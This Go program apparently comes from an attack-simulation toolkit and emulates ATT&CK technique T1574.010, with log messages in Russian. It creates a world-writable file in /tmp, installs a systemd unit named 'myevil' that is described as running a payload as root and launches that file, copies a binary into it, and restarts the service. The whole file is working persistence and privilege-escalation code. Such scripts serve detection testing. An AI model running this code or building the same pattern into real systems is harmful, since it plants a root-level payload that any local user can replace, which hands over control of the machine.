package main

import (
	"fmt"
	"os"
	"path/filepath"
	"script/pkg/files"
	"script/pkg/system"
	"script/pkg/tags"
	"strings"
	"time"
)

var (
	fileName    = "myapp"
	filePath    = "/tmp/service_file"
	servicePath = "/etc/systemd/system/myevil.service"
	serviceConf = `
[Unit]
Description=Run payload as root

[Service]
ExecStart=<path>
Type=simple

[Install]
WantedBy=multi-user.target
`
)

func main() {
	if !system.IsRoot() {
		fmt.Printf("%sThe script must be run using root permissions\n", tags.Err)
		return
	}
	fmt.Printf("%sT1574.010  Services File Permissions Weakness \n", tags.Info)
	file, err := os.Create(filePath)
	if err != nil {
		fmt.Printf("%sОшибка при создании файла %s:%s\n", tags.Err, filePath, err.Error())
		return
	}
	fmt.Printf("%sУспешно создан файл %s\n", tags.Info, filePath)
	file.Chmod(0777)
	changeExecStart(&serviceConf)
	serviceFile := files.NewFile(servicePath)
	err = serviceFile.WriteFileLines(strings.Split(serviceConf, "\n"), 0644)
	if err != nil {
		fmt.Printf("%sОшибка при записи в файл %s: %s\n", tags.Err, servicePath, err.Error())
		return
	}
	fmt.Printf("%sУспешно создан файл %s\n", tags.Info, servicePath)
	err = system.CopyFile(filepath.Join("assets", fileName), filePath, 0777)
	if err != nil {
		fmt.Printf("%sОшибка при копировании файла %s: %s\n", tags.Err, fileName, err.Error())
		return
	}
	fmt.Printf("%sФайл %s успешно скопирован в %s\n", tags.Info, fileName, filePath)
	system.UpdatePath()
	time.Sleep(time.Second * 120)
	err = system.ServiceRestart("myevil")
	if err != nil {
		fmt.Printf("%sОшибка при перезапуске службы  myevil: %s\n", tags.Err, err.Error())
		return
	}
	fmt.Printf("%sСлужба myevil успешно перезапущена\n", tags.Info)
}

func changeExecStart(serviceConf *string) {
	serviceConfLines := strings.Split(*serviceConf, "\n")
	for i := range serviceConfLines {
		if strings.Contains(serviceConfLines[i], "<path>") {
			serviceConfLines[i] = strings.ReplaceAll(serviceConfLines[i], "<path>", filePath)
		}
	}
	*serviceConf = strings.Join(serviceConfLines, "\n")
}
